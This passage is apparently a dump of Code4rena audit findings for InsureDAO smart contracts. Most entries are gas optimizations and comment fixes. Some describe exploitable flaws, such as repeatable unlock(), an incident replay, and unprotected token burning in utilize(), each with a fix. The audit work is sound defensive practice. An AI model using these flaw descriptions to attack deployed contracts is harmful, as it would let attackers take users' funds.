"2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  System will fail on low-level subtraction without proper logic level error, which can be an issue for troubleshooting and further programmatic usages by other projects.   ## Proof of Concept  Whenever user lacks _attributions (Vault shares) for the withdraw amount requested, the system will fail on subtraction:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L160   ## Recommended Mitigation Steps  Consider adding a check for the enough _attributions throwing a corresponding error   "}, {"title": "Multiple boolean comparrisons", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/194", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  loop   # Vulnerability details  When checking boolean values in a require or if statement it's an unnecessary operation to compare them to `true`, as it's already checked whether the condition is `true`. For comparison to `false`, it is cheaper to use the `!` operator rather than compare the value.  ## Proof of Concept Lines where boolean comparison is used: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L99 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L131 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L161 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L176 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L205 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L122 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L142 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L166-L169 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L178-L179 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L204 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L132 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L165 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L365 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L464 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L184 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L234 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L354 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L388 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L491 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L550 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L612 - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L664  ## Recommended Mitigation Steps Remove the `== true` part from boolean comparisons and change `_variableName == false` to `!_variableName` to save some gas.  "}, {"title": "Typo in PoolTemplate unlock function results in user being able to unlock multiple times", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/192", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  loop   # Vulnerability details  The function `unlock()` in PoolTemplate has a typo where it compares `insurances[_id].status` to `false` rather than setting it to `false`. If the conditions are met to unlock the funds for an id, the user should be able to call the `unlock()` function once for that id as `insurances[_id].amount` is subtracted from `lockedAmount`. However, since `insurances[_id].status` does not get set to `false`, a user can call `unlock()` multiple times for the same id, resulting in `lockedAmount` being way smaller than it should be since `insurances[_id].amount` is subtracted multiple times.   ## Impact `lockedAmount` is used to calculate the amount of underlying tokens available for withdrawals. If `lockedAmount` is lower than it should be users are able to withdraw more underlying tokens than available for withdrawals.  ## Proof of Concept Typo in `unlock()`: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362  Calculation of underlying tokens available for withdrawal: - https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836  ## Recommended Mitigation Steps Change `insurances[_id].status == false;` to `insurances[_id].status = false;`  "}, {"title": "PoolTemplate worth function description is incorrect", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/189", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Underlying and index tokens are mixed up in the worth() function description, making code and its description conflicting  ## Proof of Concept  Worth() computes how many iTokens correspond to given amount of underlying. The description says otherwise, mixing them up:  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L794-798    ## Recommended Mitigation Steps  Fix the description to say that \u2018_value' is the amount of underlying, while the '_amount' is the corresponding output quantity of iTokens   "}, {"title": "set  `_mintAmount = _amount;` in the memory can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/188", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "set  `_mintAmount = _amount;` in the memory can save gas"}, {"title": "Remove unnecessary if statements for gas optimization ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/186", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  ospwner   # Vulnerability details  ## Impact Checking arrays' length before using it in a for loop is unnecessary when array's length is used in loop exit condition.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L175  ```         if (_references.length > 0) {             for (uint256 i = 0; i < _references.length; i++)  ```  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L185 ```         if (_conditions.length > 0) {             for (uint256 i = 0; i < _conditions.length; i++)  ```   ## Recommended Mitigation Steps  Remove the two unnecessary  if statements.   "}, {"title": "Signature replay", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/184", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Signature replay in `PoolTemplate`.  ## Proof of Concept The `redeem` method of `PoolTemplate` verifies the data stored in `incident`, and the verification logic of this process is performed as following:  ``` require(             MerkleProof.verify(                 _merkleProof,                 _targets,                 keccak256(                     abi.encodePacked(_insurance.target, _insurance.insured)                 )             ) ||                 MerkleProof.verify(                     _merkleProof,                     _targets,                     keccak256(abi.encodePacked(_insurance.target, address(0)))                 ),             \"ERROR: INSURANCE_EXEMPTED\"         ); ```  As can be seen, the only data related to the `_insurance` are` target` and `insured`, so as the incident has no relation with the` Insurance`, apparently nothing prevents a user to call `insure` with high amounts, after receive the incident, the only thing that prevents this from being reused is that the owner creates the incident with an `_incidentTimestamp` from the past.  So if a owner create a incident from the future it's possible to create a new `insure` that could be reused by the same affected address.  Another lack of input verification that could facilitate this attack is the `_span=0` in the `insure` method.  ## Tools Used Manual review.  ## Recommended Mitigation Steps It is mandatory to add a check in `applyCover` that` _incidentTimestamp` is less than the current date and the `span` argument is greater than 0 in the` insure` method.  "}, {"title": "anyone can get money from an incident without paying beforehand", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/183", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "anyone can get money from an incident without paying beforehand"}, {"title": "Avoid use of state variables in event emissions to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/182", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-01-insure-findings", "body": "Avoid use of state variables in event emissions to save gas"}, {"title": "Checking non-zero value can avoid an external call to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/181", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Checking non-zero value can avoid an external call to save gas"}, {"title": "Caching variables", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/178", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Caching variables"}, {"title": "Incorrect Natspec can lead to errors", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/176", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  Unclear Natspec may confuse the user.  In the `fund` function:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L160](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L160)  The Natspec is a copy-paste of the `deposit` function:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L130](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L130)  The problem here is the **receives ITokens** part of the Natspec. The deposit function indeed mints tokens to the `msg.sender` but the `fund` function doesn\u2019t. I would clarify that the `fund` function adds attributions to the surplusPool.  Another minor and unclear bit of Natspec happens here: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L177](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L177)  It describes `_amount` as sender of value instead of something like **amount of value to send.**  ## Recommended Mitigation Steps  Explain the Natspec of the `fund` function in more detail. Fix the `transferValue` amount natspec. Also it would be good to add some Natspec to the `defund` function too.  "}, {"title": "Edge case in withdrawValue may lead to failed transactions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/174", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Edge case in withdrawValue may lead to failed transactions"}, {"title": "Grouping Repeated Logic Into a Modifier To Save on Deployment Costs", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Grouping Repeated Logic Into a Modifier To Save on Deployment Costs"}, {"title": "Moving Variable Declarations Before Error Checks Can Save Gas on Failure", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  In `PoolTemplate.sol` there are multiple instances where variables are declared before the error checks of the functions. In cases where a function reverts due to these error checks, that extra computation of calculating the variable being declared can be avoided by simply moving the declaration after the error checks.  Here are all the functions I found where this can be applied:  - `withdraw` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L293](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L293) - `withdrawCredit` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L416](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L416) - `insure` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L465](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L465) - `reedem` function: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L548](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L548)  ## Recommended Mitigation Steps  - Change `withdraw` function to:  ```solidity function withdraw(uint256 _amount) external returns (uint256 _retVal) {   require(       marketStatus == MarketStatus.Trading,       \"ERROR: WITHDRAWAL_PENDING\"   );   require(       withdrawalReq[msg.sender].timestamp +           parameters.getLockup(msg.sender) <           block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       withdrawalReq[msg.sender].timestamp +           parameters.getLockup(msg.sender) +           parameters.getWithdrawable(msg.sender) >           block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   );   require(       withdrawalReq[msg.sender].amount >= _amount,       \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\"   );   require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\");   require(       _retVal <= availableBalance(),       \"ERROR: WITHDRAW_INSUFFICIENT_LIQUIDITY\"   );    uint256 _supply = totalSupply();   require(_supply != 0, \"ERROR: NO_AVAILABLE_LIQUIDITY\");    uint256 _liquidity = originalLiquidity();   _retVal = (_amount * _liquidity) / _supply;    //reduce requested amount   withdrawalReq[msg.sender].amount -= _amount;    //Burn iToken   _burn(msg.sender, _amount);    //Withdraw liquidity   vault.withdrawValue(_retVal, msg.sender);    emit Withdraw(msg.sender, _amount, _retVal); } ```  - Change `withdrawCredit` function to:  ```solidity function withdrawCredit(uint256 _credit)         external         override         returns (uint256 _pending)     {       IndexInfo storage _index = indicies[msg.sender];       require(           IRegistry(registry).isListed(msg.sender) &&               _index.credit >= _credit &&               _credit <= availableBalance(),           \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"       );        uint256 _rewardPerCredit = rewardPerCredit;        //calculate acrrued premium       _pending = _sub(           (_index.credit * _rewardPerCredit) / MAGIC_SCALE_1E6,           _index.rewardDebt       );        //Withdraw liquidity       if (_credit > 0) {           totalCredit -= _credit;           _index.credit -= _credit;           emit CreditDecrease(msg.sender, _credit);       }        //withdraw acrrued premium       if (_pending > 0) {           vault.transferAttribution(_pending, msg.sender);           attributionDebt -= _pending;           _index.rewardDebt =               (_index.credit * _rewardPerCredit) /               MAGIC_SCALE_1E6;       } } ```  - Change `insure` function to:  ```solidity function insure(         uint256 _amount,         uint256 _maxCost,         uint256 _span,         bytes32 _target     ) external returns (uint256) {       //Distribute premium and fee       uint256 _premium = getPremium(_amount, _span);        require(           _amount <= availableBalance(),           \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"       );       require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");       require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");       require(           parameters.getMinDate(msg.sender) <= _span,           \"ERROR: INSURE_SPAN_BELOW_MIN\"       );        require(           marketStatus == MarketStatus.Trading,           \"ERROR: INSURE_MARKET_PENDING\"       );       require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");        uint256 _endTime = _span + block.timestamp;       uint256 _fee = parameters.getFeeRate(msg.sender);        //current liquidity       uint256 _liquidity = totalLiquidity();       uint256 _totalCredit = totalCredit;        //accrue premium/fee       uint256[2] memory _newAttribution = vault.addValueBatch(           _premium,           msg.sender,           [address(this), parameters.getOwner()],           [MAGIC_SCALE_1E6 - _fee, _fee]       );        //Lock covered amount       uint256 _id = allInsuranceCount;       lockedAmount += _amount;       Insurance memory _insurance = Insurance(           _id,           block.timestamp,           _endTime,           _amount,           _target,           msg.sender,           true       );       insurances[_id] = _insurance;       allInsuranceCount += 1;        //Calculate liquidity for index       if (_totalCredit > 0) {           uint256 _attributionForIndex = (_newAttribution[0] * _totalCredit) /               _liquidity;           attributionDebt += _attributionForIndex;           rewardPerCredit += ((_attributionForIndex * MAGIC_SCALE_1E6) /               _totalCredit);       }        emit Insured(           _id,           _amount,           _target,           block.timestamp,           _endTime,           msg.sender,           _premium       );          return _id;   } ```  - Change `redeem` function to:  ```solidity function redeem(uint256 _id, bytes32[] calldata _merkleProof) external {       require(           marketStatus == MarketStatus.Payingout,           \"ERROR: NO_APPLICABLE_INCIDENT\"       );       Insurance storage _insurance = insurances[_id];       require(_insurance.status == true, \"ERROR: INSURANCE_NOT_ACTIVE\");       require(_insurance.insured == msg.sender, \"ERROR: NOT_YOUR_INSURANCE\");       uint256 _incidentTimestamp = incident.incidentTimestamp;       require(           marketStatus == MarketStatus.Payingout &&               _insurance.startTime <= _incidentTimestamp &&               _insurance.endTime >= _incidentTimestamp,           \"ERROR: INSURANCE_NOT_APPLICABLE\"       );       bytes32 _targets = incident.merkleRoot;       require(           MerkleProof.verify(               _merkleProof,               _targets,               keccak256(                   abi.encodePacked(_insurance.target, _insurance.insured)               )           ) ||               MerkleProof.verify(                   _merkleProof,                   _targets,                   keccak256(abi.encodePacked(_insurance.target, address(0)))               ),           \"ERROR: INSURANCE_EXEMPTED\"       );       uint256 _payoutNumerator = incident.payoutNumerator;       uint256 _payoutDenominator = incident.payoutDenominator;        _insurance.status = false;       lockedAmount -= _insurance.amount;        uint256 _payoutAmount = (_insurance.amount * _payoutNumerator) /           _payoutDenominator;        vault.borrowValue(_payoutAmount, msg.sender);        emit Redeemed(           _id,           msg.sender,           _insurance.target,           _insurance.amount,           _payoutAmount       );   } ```  "}, {"title": "Unnecessary use of _msgSender()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/166", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The use of _msgSender() when there is no implementation of a meta transaction mechanism that uses it, such as EIP-2771, very slightly increases gas consumption.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/InsureDAOERC20.sol#L105  ``` function transfer(address recipient, uint256 amount)         public         virtual         override         returns (bool)     {         _transfer(_msgSender(), recipient, amount);         return true;     } ```  ## Tools Used Remix ## Recommended Mitigation Steps Replace _msgSender() with msg.sender if there is no mechanism to support meta-transactions like EIP-2771 implemented.  "}, {"title": "The fund function of the CDSTemplate contract does not match the description", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/161", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  The fund function of the CDSTemplate contract does not match the description, the caller will not receive any iToken after sending tokens, and the owner can take away the tokens in surplusPool.  ```     /**      * @notice A liquidity provider supplies collatral to the pool and receives iTokens      * @param _amount amount of token to deposit      */     function fund(uint256 _amount) external {         require(paused == false, \"ERROR: PAUSED\");          //deposit and pay fees         uint256 _attribution = vault.addValue(             _amount,             msg.sender,             address(this)         );          surplusPool += _attribution;          emit Fund(msg.sender, _amount, _attribution);     }      function defund(uint256 _amount) external override onlyOwner {         require(paused == false, \"ERROR: PAUSED\");          uint256 _attribution = vault.withdrawValue(_amount, msg.sender);         surplusPool -= _attribution;          emit Defund(msg.sender, _amount, _attribution);     } ```  ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L156-L182  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Change the description of the fund function or send iToken to the caller  "}, {"title": "Owner can call `applyCover` multiple times in `PoolTemplate.sol`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact The owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.  This can also allow the owner to emit fraudulent `MarketStatusChanged` events.  ## Recommended Mitigation Steps Require that the market be in a `Trading` state to allow another `applyCover` call.  "}, {"title": "Remove unnecessary address cast in Vault.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The Vault.sol contract contains several state variables of type address. There is no need to cast these variable to type address because they are already of type address. Removing the cast function can save gas.  ## Proof of Concept  The token address state variable is unnecessarily cast to address type in two places in Vault.sol: - [Line 350](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L350) - [Line 467](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L467)  ## Recommended Mitigation Steps  Remove the unnecessary address cast from address variables.  "}, {"title": "Tokens can be burned with no access control", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/158", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The Vault.sol contract has two address state variables, the `keeper` variable and the `controller` variable, which are both permitted to be the zero address. If both variables are zero simultaneously, any address can burn the available funds (available funds = balance - totalDebt) by sending these tokens to the zero address with the unprotected `utilitize()` function. If a user has no totalDebt, the user can lose their entire underlying token balance because of this.  ## Proof of Concept  The problematic `utilize()` function is [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352). To see how the two preconditions can occur: 1. The keeper state variable is only changed by the `setKeeper()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502). If this function is not called, the keeper variable will retain the default value of address(0), which bypasses [the only access control for the utilize function](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L344). 2. There is a comment [here on line 69](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502) stating the controller state variable can be zero. There is no zero address check for the controller state variable in the Vault constructor.  If both address variables are left at their defaults of address(0), then the safeTransfer() call [on line 348](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L348) would send the tokens to address(0).  ## Recommended Mitigation Steps  Add the following line to the very beginning of the `utilize()` function: `require(address(controller) != address(0))`  This check is already found in many other functions in Vault.sol, including the `_unutilize()` function.  "}, {"title": "Incorrect return value comment", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/157", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The comment for the return value of the `getCDS()` function in Registry.sol is incorrectly copied from elsewhere, possibly the `confirmExistence()` function. The return value is an address, not a boolean. This is considered low risk based on C4's [risk ratings](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr).  ## Proof of Concept  The problematic comment is from the `getCDS()` function [here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L99). It is an incorrect duplicate of the comment for the `confirmExistence()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L113).  ## Recommended Mitigation Steps  Replace the comment with something like `@return CDS contract address`, which is used to describe this value in the `setCDS()` function.  "}, {"title": "Inaccurate return value from `getCDS()` possible", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/155", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "Inaccurate return value from `getCDS()` possible"}, {"title": "No slippage control in CDSTemplate.sol = frontrun or sandwich", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/153", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "No slippage control in CDSTemplate.sol = frontrun or sandwich"}, {"title": "Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/145", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Use `calldata` instead of `memory` for function parameters"}, {"title": "Save gas in requestWithdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/142", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Users that incorrectly ask for a withdrawal equal to zero, will waste more gas (a storage read) since the check for `amount > 0` is put after the check for the available amount  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L191](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L191) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L199](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L199) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L282](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L282)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Move this require at the top of the `requestWithdraw` function:  ```jsx require(_amount > 0, \"ERROR: REQUEST_ZERO\"); ```  "}, {"title": "totalAllocPoint in IndexTemplate.sol can be cached", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `totalAllocPoint` in `set()` function is read several times from storage. It can be assigned to a local variable so the function is less expensive overall  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L612](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L612)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign `totalAllocPoint` to `localTotalAllocPoint` (or `cachedTotalAllocPoint`)  "}, {"title": "commitTransferOwnership() could save gas 1", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/139", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  When emitting the event, the function argument could be used, instead of reading from storage again  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Ownership.sol#L62](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Ownership.sol#L62)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Change to:  ```jsx emit CommitNewOwnership(newOwner); ```  "}, {"title": "acceptTransferOwnership() could save gas by using msg.sender", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/138", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-01-insure-findings", "body": "acceptTransferOwnership() could save gas by using msg.sender"}, {"title": "Avoid expensive storage reads in Parameters.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  Many functions that read params, check whether the value is set for the given `target`, otherwise return the value for the zero-address. When doing this kind of check, the value of the `target` is read twice:  - once for checking if it\u2019s set - if it\u2019s set, it\u2019s read once more to read the actual params  These functions are used a lot of times inside all the contracts, so having them optimized as much as possible is required in order to save gas  ## Proof of Concept  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L240](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L240) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L271](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L271) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L289](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L289) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L313](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L313) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L331](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L331) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L343](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L343) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L379](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L379) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L397](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol#L397)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Assign the target value and, if the check returns a value different from the zero-address, use it. For example, `getFeeRate` becomes:  ```jsx function getFeeRate(address _target)     external     view     override     returns (uint256) {     uint256 _targetFee = _fee[_target];     if (_targetFee == 0) {         return _fee[address(0)];     } else {         return _targetFee;     } } ```  "}, {"title": "In PoolTemplate.sol, deposit() and _depositFrom() can re-use the same code", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/133", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The public `deposit` uses basically the same code of the internal `_depositFrom`. The only difference between them is that the former uses `msg.sender`, while the latter uses a parameter as `from` address. In order to minimize code duplication, `deposit` should be calling `_depositFrom` rather than being reimplemented using copy-paste  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L232](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L232)  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L255](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L255)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Write `deposit` like this:  ```jsx function deposit(uint256 _amount) 